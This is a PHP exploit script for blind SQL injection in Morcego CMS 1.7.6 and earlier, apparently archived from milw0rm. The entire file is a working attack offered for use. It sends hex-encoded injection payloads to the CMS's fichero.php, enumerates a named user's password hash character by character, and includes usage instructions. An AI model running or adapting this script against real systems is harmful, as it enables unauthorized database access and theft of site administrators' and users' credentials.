+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-           __           __     _       __                -
+      ____/ /___ ______/ /__  (_)___  / /_____  _____    +
-     / __  / __ `/ ___/ //_/ / / __ \/ //_/ _ \/ ___/    -
+    / /_/ / /_/ / /  / ,<   / / /_/ / ,< /  __/ /        +
-    \__,_/\__,_/_/  /_/|_|_/ /\____/_/|_|\___/_/         -
+                        /___/                            +
-                                                         -
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

<?php

function usage () {
	exit (  "\n".
		"+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n".
		"-                                                                   -\n".
		"+ Morcego CMS <= 1.7.6 Blind SQL Injection Exploit                  +\n".
		"- Author  : darkjoker                                               -\n".
		"+ Site    : http://darkjoker.net23.net                              +\n".
	        "- Download: http://sourceforge.net/projects/morcegocms/             -\n".
		"+ Usage   : php xpl.php <hostname> <path> <username>                +\n".
		"- Ex.     : php xpl.php localhost /MorcegoCMS/ root                 -\n".
		"+                                                                   +\n".
		"-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-\n".
		"\n");
}

function hex ($string) {
	$i=0;
	while ($i<strlen($string)) 
		$hex .= "%".dechex(ord($string[$i++]));
	return $hex;
}

function check_chr ($hostname, $path, $pos, $char, $username) {
	$char = ord ($char);
	if (!($sp = fsockopen ($hostname, 80, $errno, $errstr, 5)))
		die ("[-] Unknow hostname.");
	$query = hex ("1' OR ASCII(SUBSTRING((SELECT password FROM morcego_users WHERE username='{$username}'),{$pos},1))={$char}-- ");
	$request = "GET {$path}fichero.php?{$query} HTTP/1.1\r\n".
		   "Host: {$hostname}\r\n".
		   "Connection: Close\r\n\r\n";
	fputs ($sp, $request);
	while (!feof ($sp))
		$reply .= fgets ($sp, 1024);
	fclose ($sp);
	if (preg_match ("|Page not found|", $reply))
		return false;
	else
		return true;
}

if ($argc != 4)
	usage ();
$hostname = $argv [1];
$path = $argv [2];
$username = $argv [3];
$array = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
echo "[+] Password (hash): ";
for ($i=0,$d=1;$i<strlen($array);) {
	if (check_chr ($hostname, $path, $d, $array [$i], $username)) {
		echo $array [$i];
		$i=0;
		$d++;
	}
	else
		$i++;
}
echo "\n";

# milw0rm.com [2009-07-10]
